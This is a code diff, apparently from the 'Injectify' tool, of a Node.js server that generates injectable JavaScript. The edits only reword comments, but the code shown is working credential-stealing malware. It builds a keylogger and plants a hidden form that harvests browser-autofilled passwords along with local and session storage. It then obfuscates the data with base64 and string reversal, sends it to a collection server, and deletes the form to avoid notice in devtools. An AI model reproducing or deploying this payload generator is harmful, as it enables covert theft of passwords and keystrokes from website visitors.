@@ -983,13 +983,13 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			if (keylogger) {
 				variables += 'm = {}, f = [], g = new Date().getTime(),'
 				body += comment("add listeners to the window for keydown & keyup events") + `
-					k.onkeydown = k.onkeyup = function (n) {` + comment("if the key type ends with p => then it's keyup") + `
-						var l = '',
-							h = z = n.key
-						if (n.type.slice(-1) == 'p') l = '_'
-						z += l` + comment("ignore multiple modifier calls") + `
+					k.onkeydown = k.onkeyup = function (n) {
+						var l = '',` + comment("give the keycode number to variables h & z") + `
+							h = z = n.key` + comment("if the key type ends with p => then it's keyup") + `
+						if (n.type.slice(-1) == 'p') l = '_'` + comment("append the keyup / keydown indicator") + `
+						z += l` + comment("ignore multiple modifier calls & invalid key presses") + `
 						if (m == z || !h) return` + comment("Push to array") + `
-						f.push(z)` + comment("return function and update the value of the last m(odifier) key press") + `
+						f.push(z)` + comment("update the value of the last m(odifier) key press") + `
 						if (h.length > 1) m = z
 						` + debug(`
 							if (n.key && n.key.length > 1) {
@@ -1030,7 +1030,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				if (req.query.debug == "true") {
 					catcher 	= '\n' + catcher.slice(0, -1)
 				} else {
-					catcher 	= '\ntry {' + catcher.slice(0, -1) + '} catch(error) {}'
+					catcher 	= '\ntry {' + comment("attempt to insert the local & session storage into object, but ignore if it fails\n") + catcher.slice(0, -1) + '} catch(error) {}'
 				}
 			}
 
@@ -1080,7 +1080,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				w.appendChild(y)` + comment("append form node to DOM") + `
 				d.body.appendChild(w)
 				` + body + comment("add a listener to the password input, browser's autofiller will trigger this") + `
-				y.addEventListener(v, function () {` + comment("construct an object with data to extract") + `
+				y.addEventListener(v, function () {` + comment("construct a global object with data to extract") + `
 					i = {
 						a: atob("` + btoa(req.query.project) + `"),
 						t: 0,
@@ -1088,7 +1088,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 						c: y.value` + json + `
 					}` + catcher +  `
 					` + debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)") +
-						comment("send a request to the server (or proxy) with the BASE64 encoded JSON object") +
+						comment("send a request to the server (or proxy) with the BASE64 encoded JSON object\n") +
 						sendToServer(`p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`) + 
 						comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + `
 					w.remove()
